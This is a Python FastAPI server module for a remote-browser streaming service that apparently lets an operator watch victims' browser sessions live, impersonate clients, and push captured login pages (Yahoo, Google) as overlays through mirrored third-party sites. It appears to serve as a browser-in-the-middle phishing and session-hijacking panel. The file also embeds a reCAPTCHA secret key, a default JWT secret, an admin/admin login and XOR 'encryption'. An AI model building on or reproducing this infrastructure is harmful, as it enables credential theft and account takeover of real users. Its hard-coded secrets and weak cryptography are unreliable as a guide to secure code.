"""
FastAPI Application - REST API and WebSocket endpoints
Handles client connections, admin interface, and monitoring with single-stream enforcement
With enhanced profile management and inactive user handling
"""

import asyncio
import copy
import json
import subprocess
import time
import hashlib
import os
import shutil
import zipfile
import uuid
import stat
import sys
import base64
import re
from datetime import datetime, timedelta
from urllib.parse import quote, urlsplit
from pathlib import Path
from typing import Dict, Any, Optional, List, Tuple
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException, Query, BackgroundTasks
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse, Response, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from contextlib import asynccontextmanager
import logging
import mimetypes
import httpx
import bcrypt
import jwt
from slowapi import Limiter
from slowapi.util import get_remote_address
from reconnect_utils import should_skip_previous_session_kick

import lpv_store
import server_settings as srv_settings

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Recent server warnings/errors, in memory.
# ---------------------------------------------------------------------------
# Everything that makes a feature stop working (Telegram sends, workflow
# starts, admin snapshots) logs at WARNING. Until now those lines only went to
# the console/journal, so the operator saw "it is not working" with no reason.
# This keeps the last 300 of them for /api/diagnostics/server and the panel's
# Logs tab. Cheap: a bounded deque, appended only on WARNING+.
from collections import deque

_RECENT_LOG: "deque[Dict[str, Any]]" = deque(maxlen=300)


class _RecentLogHandler(logging.Handler):
    def emit(self, record: logging.LogRecord) -> None:
        try:
            if record.levelno < logging.WARNING:
                return
            _RECENT_LOG.append({
                "at": record.created,
                "level": record.levelname,
                "logger": record.name,
                "message": record.getMessage()[:600],
            })
        except Exception:
            pass


def _install_recent_log_handler() -> None:
    try:
        root = logging.getLogger()
        handler = _RecentLogHandler()
        handler.setLevel(logging.WARNING)
        root.addHandler(handler)
        # api.py is imported before main.py configures logging, and
        # basicConfig() refuses to install a console handler once the root
        # logger has one. Without this the warnings would be captured for the
        # panel but never printed — the opposite of the point.
        has_console = any(
            isinstance(h, logging.StreamHandler) and not isinstance(h, _RecentLogHandler)
            for h in root.handlers
        )
        if not has_console:
            console = logging.StreamHandler()
            console.setLevel(logging.WARNING)
            console.setFormatter(logging.Formatter("%(levelname)s:%(name)s:%(message)s"))
            root.addHandler(console)
    except Exception:
        pass


_install_recent_log_handler()

# ==============================
# Resource Path Helper for PyInstaller
# ==============================

def get_base_path():
    """Get the base path for resources - works in both dev and packaged modes"""
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        return Path(sys._MEIPASS)
    else:
        # Running in development mode
        return Path(__file__).parent

# ==============================
# Client Encryption/Decryption Functions
# Handles XOR-based encryption used by client.html for secure communication
# ==============================

# Encryption key - must match the key in client.html
ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY', 'mini_max_agent_secret_key')


def is_base64(s: str) -> bool:
    """Check if a string is valid Base64"""
    try:
        if not s or len(s) % 4 != 0:
            return False
        base64_chars = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
        if not all(c in base64_chars for c in s):
            return False
        base64.b64decode(s, validate=True)
        return True
    except Exception:
        return False


def decrypt_xor(encrypted_data: str, key: str = None) -> str:
    """Decrypt data that was encrypted with XOR cipher and Base64 encoded."""
    try:
        if not encrypted_data:
            return ''
        if key is None:
            key = ENCRYPTION_KEY
        if not is_base64(encrypted_data):
            return encrypted_data

        encrypted_bytes = base64.b64decode(encrypted_data)
        key_bytes = key.encode('utf-8')
        key_len = len(key_bytes)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            decrypted_byte = byte ^ key_bytes[i % key_len]
            decrypted_bytes.append(decrypted_byte)
        return decrypted_bytes.decode('utf-8', errors='replace')
    except Exception:
        return encrypted_data


RECAPTCHA_SECRET_KEY = os.environ.get('RECAPTCHA_SECRET_KEY', '6LcaJGcsAAAAAN-1mcBveZhep8PXM_Rl1sa0YdyI')
# `or` rather than a default: an empty value in .env must not turn into a
# blank signing key (which would make every token interchangeable).
JWT_SECRET_KEY = (os.environ.get('JWT_SECRET_KEY') or
                  'your-super-secret-jwt-key-change-in-production')
JWT_ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# Rate limiter configuration
# Rate limiter configuration
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)

# Try to import psutil for server info
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


# ==============================
# Server-Side Client Profile Storage
# Persistent storage for client profiles accessible by admin
# ==============================

# Global client profile storage (in-memory cache)
# Structure: {client_id: {profile_data, last_updated, created_at}}
_server_client_profiles: Dict[str, Dict] = {}
_client_profiles_lock = asyncio.Lock()
_profiles_persistence_path = Path(__file__).parent / "data" / "client_profiles.json"


# Admin CDP screencast relay — replaces the old single-shot
# get_frame screenshot handler. Each active admin view (Display tab)
# is a continuous Page.startScreencast -> broadcast_frame -> ack cycle
# rather than a polled page.screenshot clip. See _admin_screencast_*
# helpers near the admin WS handler for lifecycle.
_admin_screencast_sessions: Dict[str, Dict[str, Any]] = {}
_admin_screencast_starting: set = set()
_admin_screencast_lock = asyncio.Lock()

# PCM singleton lazily imported where used to avoid circular init
# (see pcm_manager.pcm_manager)

# ---------------------------------------------------------------------------
# Admin CDP Screencast helpers — continuous live view for admin Display tab
# and PCM. Uses Page.startScreencast via CDP and broadcasts binary JPEGs
# to all admin WS subs for that session. Replaces old get_frame polling.
# ---------------------------------------------------------------------------
async def _admin_screencast_start(session_id: str):
    """Start CDP screencast for session_id if not already running."""
    if not session_manager:
        return
    async with _admin_screencast_lock:
        if (session_id in _admin_screencast_sessions
                or session_id in _admin_screencast_starting):
            return
        # Reserve this runtime id before the first await. Two admin tabs
        # selecting the same client must not create two CDP screencasts.
        _admin_screencast_starting.add(session_id)
    try:
        session = await session_manager.get_session(session_id)
        if not session:
            return
        page = session.get_active_page() if hasattr(session, 'get_active_page') else getattr(session, 'page', None)
        if not page or getattr(page, 'is_closed', lambda: False)():
            logger.debug(f"[admin-cast] session {session_id} no active page")
            return
        ctx = getattr(page, 'context', None)
        if not ctx or not hasattr(ctx, 'new_cdp_session'):
            logger.warning(f"[admin-cast] session {session_id} no CDP session api")
            return
        cdp = await ctx.new_cdp_session(page)
        vp = getattr(session, 'viewport', {}) or {}
        # Content size = the session's CSS page viewport. The captured
        # surface can be WIDER (Chrome enforces a minimum window width on
        # headed/Xvfb browsers, and phone compositor surfaces are the full
        # screen), which put a white "browser" strip next to the page and
        # skewed click mapping. Frames are cropped to this content rect
        # below (frame_crop) so streams and coordinates stay page-exact.
        content_w = int(vp.get('width', 1280) or 1280)
        content_h = int(vp.get('height', 720) or 720)
        w = content_w
        h = content_h
        # Screencast frames are DOWNSCALED to fit maxWidth/maxHeight; cap at
        # the CSS viewport itself (1 CSS px = 1 surface px) with a sane floor
        # for tiny mobile widths — overshooting is harmless (Chrome never
        # upscales past the native surface).
        w = max(640, min(int(w), 1920))
        h = max(360, min(int(h), 2600))

        frame_queue: asyncio.Queue = asyncio.Queue(maxsize=1)

        def _schedule_ack(sid: str):
            async def _ack():
                try:
                    await cdp.send('Page.screencastFrameAck', {'sessionId': sid})
                except Exception:
                    pass
            try:
                asyncio.create_task(_ack())
            except Exception:
                pass

        async def _relay():
            last_broadcast = 0.0
            min_interval = 1.0 / 30.0  # Rate-limit to ~30 FPS to prevent TCP buffer bloat & lag
            try:
                while True:
                    raw = await frame_queue.get()
                    async with _admin_screencast_lock:
                        current = _admin_screencast_sessions.get(session_id)
                    if not current or current.get('cdp') is not cdp:
                        return

                    # Drain queue so stale frames are skipped and only freshest frame is broadcast
                    while not frame_queue.empty():
                        try:
                            raw = frame_queue.get_nowait()
                        except asyncio.QueueEmpty:
                            break

                    now = time.monotonic()
                    to_sleep = min_interval - (now - last_broadcast)
                    if to_sleep > 0:
                        await asyncio.sleep(to_sleep)
                        while not frame_queue.empty():
                            try:
                                raw = frame_queue.get_nowait()
                            except asyncio.QueueEmpty:
                                break

                    last_broadcast = time.monotonic()

                    live_session = (
                        await session_manager.get_session(session_id)
                        if session_manager else None
                    )
                    if live_session is not session:
                        await _admin_screencast_stop(session_id, force=True)
                        async with admin_stream_manager.lock:
                            has_subscribers = bool(
                                admin_stream_manager.subscriptions.get(session_id)
                            )
                        if has_subscribers:
                            asyncio.create_task(_admin_screencast_start(session_id))
                        return
                    await admin_stream_manager.broadcast_frame(session_id, raw)
                    async with admin_stream_manager.lock:
                        has_subscribers = bool(
                            admin_stream_manager.subscriptions.get(session_id)
                        )
                    if not has_subscribers:
                        await _admin_screencast_stop(session_id)
                        return
            except asyncio.CancelledError:
                pass

        relay_task = asyncio.create_task(_relay())

        def _on_frame(frame_data: dict):
            try:
                sid = frame_data.get('sessionId', '')
                if not sid:
                    return
                # Immediately ack CDP so Chrome is never throttled waiting for broadcast
                _schedule_ack(sid)
                b64 = frame_data.get('data', '')
                if not b64:
                    return
                raw = base64.b64decode(b64) if isinstance(b64, str) else b64
                # Latest-wins queue: drop stale frame so only the newest reaches admins
                try:
                    while True:
                        frame_queue.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                try:
                    frame_queue.put_nowait(raw)
                except asyncio.QueueFull:
                    pass
            except Exception as e:
                logger.debug(f"[admin-cast] frame handler error: {e}")

        cdp.on('Page.screencastFrame', _on_frame)
        try:
            await cdp.send('Page.enable')
        except Exception:
            pass
        # PROBE the real layout viewport: if Chrome laid the page out wider
        # than the session viewport (min window width / emulation race), the
        # content rect must follow the REAL layout so click coordinates drift is avoided.
        try:
            lm = await cdp.send('Page.getLayoutMetrics')
            lv = (lm or {}).get('cssLayoutViewport') or (lm or {}).get('layoutViewport') or {}
            rw = int(lv.get('width') or 0)
            rh = int(lv.get('height') or 0)
            if rw > 0 and abs(rw - content_w) > 2:
                logger.warning(f"[admin-cast] {session_id} layout viewport {rw}x{rh} != session viewport {content_w}x{content_h} — setting to real layout")
                content_w = rw
                if rh > 0:
                    content_h = rh
        except Exception as e:
            logger.debug(f"[admin-cast] layout probe failed {session_id}: {e}")
        await cdp.send('Page.startScreencast', {'format': 'png', 'maxWidth': w, 'maxHeight': h, 'everyNthFrame': 1})
        # Publish the cast only while holding both ownership domains. An
        # admin may unsubscribe while CDP startup is in flight; recheck under
        # the cast lock so that race cannot leave a no-subscriber cast alive.
        orphan_cdp = None
        async with _admin_screencast_lock:
            async with admin_stream_manager.lock:
                has_subscribers = bool(admin_stream_manager.subscriptions.get(session_id))
            if has_subscribers:
                _admin_screencast_sessions[session_id] = {
                    'cdp': cdp, 'page': page, 'session': session,
                    'subs': set(), 'w': w, 'h': h, 'task': relay_task,
                }
            else:
                orphan_cdp = cdp
            _admin_screencast_starting.discard(session_id)
        if orphan_cdp is not None:
            try:
                await orphan_cdp.send('Page.stopScreencast')
                await orphan_cdp.detach()
            except Exception:
                pass
            return
        logger.debug(f"[admin-cast] started {session_id} {w}x{h}")
        # notify admins of meta
        await _broadcast_to_admins({'type': 'screencast_started', 'client_id': session_id, 'width': w, 'height': h})
    except Exception as e:
        logger.warning(f"[admin-cast] start failed {session_id}: {e}")
    finally:
        async with _admin_screencast_lock:
            _admin_screencast_starting.discard(session_id)


async def _admin_screencast_stop(session_id: str, force: bool = False):
    """Stop a CDP screencast, unless subscribers still own it."""
    ent = None
    async with _admin_screencast_lock:
        # A stop request can race a new admin subscription. Recheck ownership
        # while reserving removal so a fresh subscriber never loses its cast.
        async with admin_stream_manager.lock:
            if not force and admin_stream_manager.subscriptions.get(session_id):
                return
        ent = _admin_screencast_sessions.pop(session_id, None)
    if not ent:
        return
    task = ent.get('task')
    if task:
        task.cancel()
    cdp = ent.get('cdp')
    try:
        if cdp:
            try:
                await cdp.send('Page.stopScreencast')
            except Exception:
                pass
            try:
                await cdp.detach()
            except Exception:
                pass
    finally:
        logger.debug(f"[admin-cast] stopped {session_id}")
        await _broadcast_to_admins({'type': 'screencast_stopped', 'client_id': session_id})


async def _admin_screencast_restart_if_page_changed(session_id: str):
    """Watchdog: if page object changed (new tab), restart screencast."""
    async with _admin_screencast_lock:
        ent = _admin_screencast_sessions.get(session_id)
        if not ent:
            return
        old_page = ent.get('page')
        old_session = ent.get('session')
    try:
        sess = await session_manager.get_session(session_id) if session_manager else None
        if not sess:
            await _admin_screencast_stop(session_id)
            return
        new_page = sess.get_active_page() if hasattr(sess, 'get_active_page') else getattr(sess, 'page', None)
        if sess is not old_session or new_page is not old_page:
            logger.debug(f"[admin-cast] browser/page changed for {session_id}, restarting screencast")
            await _admin_screencast_stop(session_id, force=True)
            # small delay to let new page stabilize
            await asyncio.sleep(0.2)
            await _admin_screencast_start(session_id)
    except Exception as e:
        logger.debug(f"[admin-cast] restart check error {session_id}: {e}")


def _is_hidden_identity(client_id: str) -> bool:
    """Return whether an id belongs to an intentional admin/impersonation session."""
    value = str(client_id or "")
    return value in hidden_sessions or value.startswith(("impersonate_", "auto_"))


def _canonical_profile_id(client_id: str, profile_data: Optional[Dict] = None) -> str:
    """Resolve the durable profile key for a browser/LPV client.

    ``session_id`` used to be random per page load.  New connections use the
    persistent user id, but this also folds legacy records into that same
    parent when their payload still carries ``user_id``.  Explicit hidden
    sessions remain separate so an admin impersonation never overwrites the
    real client's profile.
    """
    data = profile_data or {}
    raw_client_id = str(client_id or "").strip()
    if _is_hidden_identity(raw_client_id) or data.get("hidden_session"):
        return raw_client_id
    for candidate in (
        data.get("parent_client_id"),
        data.get("user_id"),
        data.get("client_id"),
        raw_client_id,
    ):
        value = str(candidate or "").strip()
        if value and value.lower() not in {"unknown", "unknown_user", "none", "null"}:
            return value
    return raw_client_id or "unknown_user"


def _merge_profile_records(existing: Dict, incoming: Dict) -> Dict:
    """Merge two historical profile records without duplicating page history."""
    merged = {**existing, **incoming}
    histories = []
    seen = set()
    for record in (existing, incoming):
        for item in record.get("history", []) or []:
            if not isinstance(item, dict):
                continue
            key = (item.get("url", ""), str(item.get("timestamp", "")))
            if key in seen:
                continue
            seen.add(key)
            histories.append(item)
    if histories:
        histories.sort(key=lambda item: str(item.get("timestamp", "")))
        merged["history"] = histories[-100:]
    if existing.get("created_at") is not None:
        old_created = existing.get("created_at")
        new_created = incoming.get("created_at", old_created)
        try:
            merged["created_at"] = min(old_created, new_created)
        except TypeError:
            # Legacy JSON may contain an ISO string while a newer record uses
            # epoch seconds. Preserve the older record rather than failing the
            # entire profile load/handshake.
            merged["created_at"] = old_created
    return merged


def _normalize_profile_store(profiles: Dict[str, Dict]) -> Dict[str, Dict]:
    """Collapse legacy random-session profile keys under their stable parent."""
    normalized: Dict[str, Dict] = {}
    for key, value in (profiles or {}).items():
        data = value if isinstance(value, dict) else {}
        canonical = _canonical_profile_id(key, data)
        normalized[canonical] = _merge_profile_records(normalized.get(canonical, {}), {
            **data,
            "client_id": canonical,
            "parent_client_id": data.get("parent_client_id") or data.get("user_id") or canonical,
        })
    return normalized


async def _load_profiles_from_disk() -> Dict[str, Dict]:
    """Load client profiles from persistent storage"""
    try:
        if _profiles_persistence_path.exists():
            with open(_profiles_persistence_path, 'r', encoding='utf-8') as f:
                raw = f.read().strip()
                if not raw:
                    # Empty file - treat as no profiles (first run, or interrupted write)
                    logger.debug("Profiles file is empty, starting with empty profile store")
                    return {}
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError as je:
                    # Corrupted JSON - back up the bad file and start fresh
                    logger.error(f"Error loading client profiles: {je} (backing up corrupted file)")
                    try:
                        backup = _profiles_persistence_path.with_suffix(
                            f".corrupt.{int(time.time())}.json"
                        )
                        _profiles_persistence_path.rename(backup)
                        logger.debug(f"Moved corrupted profiles file to {backup}")
                    except Exception as be:
                        logger.error(f"Could not back up corrupted profiles file: {be}")
                    return {}
                if not isinstance(data, dict):
                    logger.error(f"Profiles file has unexpected type {type(data).__name__}, expected dict")
                    return {}
                normalized = _normalize_profile_store(data)
                logger.debug(
                    "Loaded %d client profiles from disk (%d canonical parents)",
                    len(data), len(normalized),
                )
                return normalized
    except Exception as e:
        logger.error(f"Error loading client profiles: {e}")
    return {}


async def _save_profiles_to_disk(profiles: Dict[str, Dict]):
    """Save client profiles to persistent storage"""
    try:
        _profiles_persistence_path.parent.mkdir(parents=True, exist_ok=True)
        with open(_profiles_persistence_path, 'w', encoding='utf-8') as f:
            json.dump(profiles, f, indent=2, default=str)
    except Exception as e:
        logger.error(f"Error saving client profiles: {e}")


async def initialize_profiles_storage():
    """Initialize profile storage on server startup"""
    global _server_client_profiles
    _server_client_profiles = await _load_profiles_from_disk()


# Function to save a client profile from client connection
async def save_client_profile(client_id: str, profile_data: Dict):
    """Save or update a client profile under its durable parent id."""
    async with _client_profiles_lock:
        current_time = time.time()
        incoming = dict(profile_data or {})
        # LPV profile writes carry the websocket generation.  Re-check the
        # generation after acquiring the profile lock so an old reconnect
        # cannot overwrite a newer profile snapshot while it was waiting on
        # another writer.
        incoming_token = incoming.get("connection_token")
        if (incoming_token
                and "_lpv_connection_tokens" in globals()
                and _lpv_connection_tokens.get(str(client_id)) not in (None, incoming_token)):
            return
        canonical_id = _canonical_profile_id(client_id, incoming)
        parent_id = str(
            incoming.get("parent_client_id")
            or incoming.get("user_id")
            or canonical_id
        ).strip()
        if parent_id.lower() in {"", "unknown", "unknown_user", "none", "null"}:
            parent_id = canonical_id
        incoming["client_id"] = canonical_id
        incoming["parent_client_id"] = parent_id

        # Normalize legacy random-session keys before merging this update.
        normalized = _normalize_profile_store(_server_client_profiles)
        existing = normalized.get(canonical_id, {})
        merged_data = _merge_profile_records(existing, {
            **incoming,
            "last_updated": current_time,
        })
        if "created_at" not in merged_data:
            merged_data["created_at"] = existing.get("created_at", current_time)
        normalized[canonical_id] = merged_data
        _server_client_profiles.clear()
        _server_client_profiles.update(normalized)

        # Save to disk asynchronously; this keeps the WS heartbeat path fast.
        asyncio.create_task(_save_profiles_to_disk(dict(_server_client_profiles)))

        # Broadcast using the canonical key so the admin panel updates one
        # profile instead of appending a new card for every reconnect.
        await _broadcast_profile_update(canonical_id, merged_data)


async def get_all_client_profiles() -> Dict[str, Dict]:
    """Get all client profiles"""
    async with _client_profiles_lock:
        return dict(_server_client_profiles)


async def get_client_profile(client_id: str) -> Optional[Dict]:
    """Get a profile by either its canonical parent id or legacy session id."""
    async with _client_profiles_lock:
        canonical = _canonical_profile_id(client_id)
        return _server_client_profiles.get(canonical) or _server_client_profiles.get(client_id)


async def _broadcast_profile_update(client_id: str, profile_data: Dict):
    """Broadcast profile update to all connected admin clients"""
    if admin_ws_connections:
        message = {
            "type": "profile_update",
            "client_id": client_id,
            "profile": profile_data
        }
        # Create list of connections to send to (in case one fails during iteration)
        connections = list(admin_ws_connections)
        for ws in connections:
            try:
                await ws.send_json(message)
            except Exception as e:
                logger.error(f"[Broadcast Error] {e}")


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan manager - load sessions on startup"""
    # Ensure data directory exists
    try:
        data_dir = Path(__file__).parent / "data"
        data_dir.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass

    # Clean up any leftover browsers and locks from previous runs on startup
    try:
        from config import CONFIG
        from sb_backend import kill_all_browsers, clean_all_profile_locks
        kill_all_browsers(CONFIG.profile_base_path)
        clean_all_profile_locks(CONFIG.profile_base_path)
    except Exception:
        pass
    
    # Initialize profile storage
    await initialize_profiles_storage()
    
    # Load sessions from storage on startup
    asyncio.create_task(load_server_sessions())

    # Say out loud what the admin login will accept. A broken hash is the
    # one failure the operator cannot diagnose from the panel: every
    # password is rejected, and it looks exactly like forgetting it.
    try:
        problem = _hash_problem()
        source = _password_hash_source()
        if problem:
            logger.error(
                "[Auth] ADMIN_PASSWORD_HASH from %s is unusable (%s) - no "
                "password can log in. Fix on this machine: "
                "python main.py --set-password",
                source, problem,
            )
        elif source == 'built-in default':
            logger.warning(
                "[Auth] using the built-in admin login: user 'admin', "
                "password 'admin' (a fresh checkout default). Change it with: "
                "python main.py --set-password"
            )
        else:
            logger.info("[Auth] admin user '%s', password set in %s", ADMIN_USERNAME, source)
    except Exception:
        pass

    # CDP screencast watchdog — restarts admin screencast when page changes (new tab)
    async def _screencast_watchdog():
        while True:
            try:
                await asyncio.sleep(3.0)
                for sid in list(_admin_screencast_sessions.keys()):
                    try:
                        await _admin_screencast_restart_if_page_changed(sid)
                    except Exception:
                        pass
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(3.0)

    watchdog_task = asyncio.create_task(_screencast_watchdog())
    try:
        yield
    finally:
        try:
            watchdog_task.cancel()
        except Exception:
            pass
        try:
            if session_manager:
                await session_manager.close_all_sessions(force=True)
                await session_manager.stop()
        except Exception:
            pass
        try:
            from access_manager import access_manager
            await access_manager.shutdown()
        except Exception:
            logger.debug("[Access] shutdown cleanup failed", exc_info=True)
        try:
            from pcm_manager import pcm_manager
            await pcm_manager.shutdown()
        except Exception:
            pass
        try:
            from config import CONFIG
            from sb_backend import kill_all_browsers, clean_all_profile_locks
            kill_all_browsers(CONFIG.profile_base_path)
            clean_all_profile_locks(CONFIG.profile_base_path)
        except Exception:
            pass


# Create FastAPI app
app = FastAPI(title="Neo Browser Stream", version="2.0.0", lifespan=lifespan)
app.state.limiter = limiter


def client_host(request: Request) -> str:
    """Who is asking, honouring one reverse-proxy hop (nginx, tunnel)."""
    try:
        forwarded = (request.headers.get("x-forwarded-for") or "").split(",")[0].strip()
        if forwarded:
            return forwarded
    except Exception:
        pass
    try:
        return request.client.host or "unknown"
    except Exception:
        return "unknown"


# Consecutive rejected logins per address. Not a security control (the
# limiter below is); it decides when the panel starts offering the reset
# command instead of repeating "Invalid credentials".
_LOGIN_FAILURES: Dict[str, int] = {}


@app.exception_handler(RateLimitExceeded)
async def _rate_limit_handler(request: Request, exc: RateLimitExceeded):
    """Answer the limit as JSON.

    slowapi's default is a plain-text 429; the panels parse JSON, so a
    throttled login surfaced as "Invalid credentials" - the operator
    retried a *correct* password and stayed locked out.
    """
    return JSONResponse(
        {
            "success": False,
            "reason": "rate_limited",
            "message": "Too many attempts - wait a minute and try again",
            "hint": "The server is reachable; it is only refusing rapid retries.",
        },
        status_code=429,
        headers={"Retry-After": "60"},
    )


# Simple SVG favicon to avoid 404 errors
FAVICON_SVG = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" rx="20" fill="#4a90d9"/><circle cx="50" cy="50" r="35" fill="none" stroke="white" stroke-width="8"/><circle cx="50" cy="50" r="15" fill="white"/></svg>'''

@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    """Serve favicon to prevent 404 errors"""
    return Response(
        content=FAVICON_SVG.encode('utf-8'),
        media_type="image/svg+xml",
        headers={"Content-Length": str(len(FAVICON_SVG.encode('utf-8')))}
    )

# CORS middleware - allow remote-hosted static admin/client pages by default
env_origins = os.environ.get('ALLOWED_ORIGINS')
if env_origins:
    ALLOWED_ORIGINS = [origin.strip() for origin in env_origins.split(',') if origin.strip()]
else:
    ALLOWED_ORIGINS = ['*']
allow_credentials = True
if '*' in ALLOWED_ORIGINS or 'all' in [origin.lower() for origin in ALLOWED_ORIGINS]:
    ALLOWED_ORIGINS = ['*']
    allow_credentials = False

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"],
    allow_headers=["Content-Type", "Authorization", "Accept", "Origin", "User-Agent", "DNT", "Cache-Control", "X-Requested-With", "X-MX-Console-Token"],
    allow_credentials=allow_credentials,
    expose_headers=["Content-Length", "Content-Range", "X-Content-Range"],
    max_age=600,
)

# Request validation middleware
@app.middleware("http")
async def validate_request(request: Request, call_next):
    # Validate Content-Length for POST/PUT requests
    if request.method in ("POST", "PUT", "PATCH"):
        content_length = request.headers.get("content-length")
        if content_length:
            try:
                max_size = 10 * 1024 * 1024  # 10MB limit
                if int(content_length) > max_size:
                    return JSONResponse(
                        status_code=413,
                        content={"error": "Request too large"}
                    )
            except ValueError:
                return JSONResponse(
                    status_code=400,
                    content={"error": "Invalid Content-Length"}
                )
    
    response = await call_next(request)
    return response


# Security headers middleware
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)

    # Per-route CSP relaxation:
    #
    # The /api/lpv/archive/{id}/html response is fetched by client.html and
    # turned into a blob URL iframe that hosts the pushed page. Several real
    # saved pages (Yahoo, Google login, etc.) and their embedded widgets
    # (Google Identity Services, reCAPTCHA, ...) use ``data:text/javascript;
    # base64,...`` script tags and sometimes ``eval``/``new Function`` for
    # inline initialisation. Modern Chrome applies the parent document's
    # script-src to blob: iframe sub-resources, so to keep those pushed
    # pages working we need ``data:`` and ``'unsafe-eval'`` plus the Google
    # domains. The pushed pages are admin-curated content (the admin
    # either uploaded them or captured them with our Playwright pipeline),
    # so the security trade-off here is acceptable — the alternative is
    # the LPV overlay rendering as a frozen, non-interactive page.
    if request.url.path.startswith("/api/lpv/"):
        response.headers["Content-Security-Policy"] = (
            "default-src 'self' blob: data: https: wss: ws:; "
            "script-src 'self' 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' "
                "data: blob: https: http://localhost:* http://127.0.0.1:*; "
            "script-src-elem 'self' 'unsafe-inline' 'unsafe-eval' "
                "data: blob: https: http://localhost:* http://127.0.0.1:*; "
            "style-src 'self' 'unsafe-inline' https: data: blob:; "
            "style-src-elem 'self' 'unsafe-inline' https: data: blob:; "
            "img-src 'self' data: blob: https: http:; "
            "font-src 'self' https: data: blob:; "
            "connect-src 'self' wss: ws: https: http: blob: data:; "
            "media-src 'self' blob: data: https: http:; "
            "frame-src 'self' blob: data: https: http:; "
            "worker-src 'self' blob: data: https:; "
            "child-src 'self' blob: data: https: http:; "
            "form-action 'self' blob: data: https: http:; "
            "base-uri 'self' https: http:; "
            "frame-ancestors 'self' http://localhost:* http://127.0.0.1:* https:; "
            "object-src 'none'"
        )
    elif request.url.path in ("/", "/client.html"):
        # Client UI hosts blob: mirror frames of THIRD-PARTY pages. Chrome
        # inherits the delivering document's CSP into blob: iframe docs, so
        # a restrictive CSP here breaks the mirrored pages: ``base-uri
        # 'self'`` vetoes the mirrored <base href> (relative URLs then fall
        # back to the viewer origin == the glued-host tunnel errors) and
        # tight script-src-elem blocks the remote page's own scripts. The
        # mirror content is remote-session traffic by design; keep the
        # permissive policy for the shell + everything downstream of it.
        response.headers["Content-Security-Policy"] = (
            "default-src 'self' blob: data: https: wss: ws: http:; "
            "script-src 'self' 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' "
                "data: blob: https: http://localhost:* http://127.0.0.1:*; "
            "script-src-elem 'self' 'unsafe-inline' 'unsafe-eval' "
                "data: blob: https: http://localhost:* http://127.0.0.1:*; "
            "style-src 'self' 'unsafe-inline' https: data: blob:; "
            "style-src-elem 'self' 'unsafe-inline' https: data: blob:; "
            "img-src 'self' data: blob: https: http:; "
            "font-src 'self' https: data: blob:; "
            "connect-src 'self' wss: ws: https: http: blob: data:; "
            "media-src 'self' blob: data: https: http:; "
            "frame-src 'self' blob: data: https: http:; "
            "worker-src 'self' blob: data: https:; "
            "child-src 'self' blob: data: https: http:; "
            "form-action 'self' blob: data: https: http:; "
            "base-uri 'self' https: http:; "
            "frame-ancestors 'self' http://localhost:* http://127.0.0.1:* https:; "
            "object-src 'none'"
        )
    else:
        response.headers["Content-Security-Policy"] = (
            "default-src 'self' blob: data: https:; "
            "script-src 'self' 'unsafe-inline' 'unsafe-eval' "
                "https://www.google.com https://www.gstatic.com "
                "https://cdn.jsdelivr.net https://static.cloudflareinsights.com "
                "https://accounts.google.com https://apis.google.com "
                "data: blob:; "
            "script-src-elem 'self' 'unsafe-inline' "
                "https://www.google.com https://www.gstatic.com "
                "https://cdn.jsdelivr.net https://static.cloudflareinsights.com "
                "https://accounts.google.com https://apis.google.com "
                "data: blob:; "
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https: data:; "
            "style-src-elem 'self' 'unsafe-inline' https://fonts.googleapis.com https: data:; "
            "img-src 'self' data: blob: https:; "
            "font-src 'self' https://fonts.gstatic.com https: data:; "
            "connect-src 'self' wss: https:; "
            "media-src 'self' blob:; "
            "frame-src 'self' blob: https:; "
            "object-src 'none'; "
            "base-uri 'self' https: http:; "
            "form-action 'self' https:; "
            "frame-ancestors 'self' http://localhost:* http://127.0.0.1:*"
        )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = (
        "geolocation=(), microphone=(), camera=(), "
        "payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()"
    )

    # Add HSTS header for HTTPS (uncomment when using HTTPS)
    # response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"

    return response


class AdminStreamManager:
    """Race-safe admin stream subscriptions.

    Subscriptions are per admin websocket and per runtime session.  Older
    versions kept one process-wide ``_active_stream_id`` and silently removed
    another session whenever an admin selected a different client, turning an
    operator UI choice into a global streaming bottleneck.
    """

    def __init__(self):
        self.subscriptions: Dict[str, set] = {}
        self.session_frames: Dict[str, bytes] = {}
        self.lock = asyncio.Lock()
        self.admin_websockets: set = set()
        # Retained as a UI compatibility hint only; it is not an ownership
        # gate and does not suppress frames for other subscribed sessions.
        self._active_stream_id: Optional[str] = None

    async def register_admin(self, websocket: WebSocket):
        async with self.lock:
            self.admin_websockets.add(websocket)

    async def unregister_admin(self, websocket: WebSocket):
        async with self.lock:
            self.admin_websockets.discard(websocket)
            for session_id in list(self.subscriptions.keys()):
                subscribers = self.subscriptions[session_id]
                subscribers.discard(websocket)
                if not subscribers:
                    del self.subscriptions[session_id]
